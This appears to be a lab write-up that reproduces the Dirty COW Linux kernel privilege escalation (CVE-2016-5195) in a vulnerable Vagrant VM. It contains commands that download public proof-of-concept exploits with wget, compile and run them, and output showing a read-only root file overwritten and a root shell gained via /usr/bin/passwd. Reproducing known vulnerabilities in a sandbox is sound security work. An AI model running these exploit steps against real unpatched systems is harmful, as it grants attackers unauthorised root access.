# CVE-2016-5195_DirtyCow 

## Vulnerability information

 * Description

	Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka "Dirty COW."

## vagrant up

```
$ vagrant up
Bringing machine 'vve.test' up with 'virtualbox' provider...
==> vve.test: Importing base box 'debian/wheezy64'...
==> vve.test: Matching MAC address for NAT networking...
==> vve.test: Checking if box 'debian/wheezy64' is up to date...
==> vve.test: Setting the name of the VM: CVE-2016-5195_DirtyCow_vvetest_1518397500434_97609
==> vve.test: Fixed port collision for 22 => 2222. Now on port 2200.
==> vve.test: Clearing any previously set network interfaces...
(snip)
    vve.test: Guest Additions Version: 4.3.18
    vve.test: VirtualBox Version: 5.2
==> vve.test: Configuring and enabling network interfaces...
```

## vagrant ssh

```
$ vagrant ssh
Linux debian-780-wheezy 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 24 08:15:24 2015 from 10.0.2.2
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
```

## VVE infomation

```
vagrant@debian-780-wheezy:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 7.8 (wheezy)
Release:        7.8
Codename:       wheezy
vagrant@debian-780-wheezy:~$ uname -a
Linux debian-780-wheezy 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1 x86_64 GNU/Linux
```

# POC

## dirtyc0w 

exploited

```
$ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
```

## cowroot.c

compile error

```
$ wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
$ gcc cowroot.c -o cowroot -pthread
cowroot.c: In function 'procselfmemThread':
cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
In file included from cowroot.c:27:0:
/usr/include/unistd.h:331:16: note: expected '__off_t' but argument is of type 'void *'
```

## pokemon.c

```
$ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
$ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
pikachu
-rw-r--r-- 1 root root 8 Feb 12 02:09 pokeball
pokeball
   (___)
   (o o)_____/
    @@ `     \
     \ ____, /miltank
     //    //
    ^^    ^^
mmap 7f3aec09e000
madvise 0
ptrace 0
```

## c0w.c

got root

```
vagrant@debian-780-wheezy:~/c0w$ wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c
vagrant@debian-780-wheezy:~/c0w$ gcc -pthread c0w.c  -o c0w
vagrant@debian-780-wheezy:~/c0w$ ./c0w

   (___)
   (o o)_____/
    @@ `     \
     \ ____, //usr/bin/passwd
     //    //
    ^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 2df04000

madvise 0

ptrace 0

vagrant@debian-780-wheezy:~/c0w$ /usr/bin/passwd
root@debian-780-wheezy:/home/vagrant/c0w# whoami
root
```

## Vagrant package

```
$ vagrant package
==> vve.test: Attempting graceful shutdown of VM...
==> vve.test: Clearing any previously set forwarded ports...
==> vve.test: Exporting VM...
==> vve.test: Compressing package to: /Users/0shin/VVE/CVE-2016-5195_DirtyCow/package.box
```

## Retest

```
vagrant box add debian package.box
vagrant init customized_debian
vagrant up
```

# Reference 

  * https://dirtycow.ninja/
  * https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
  * https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  * https://security-tracker.debian.org/tracker/CVE-2016-5195


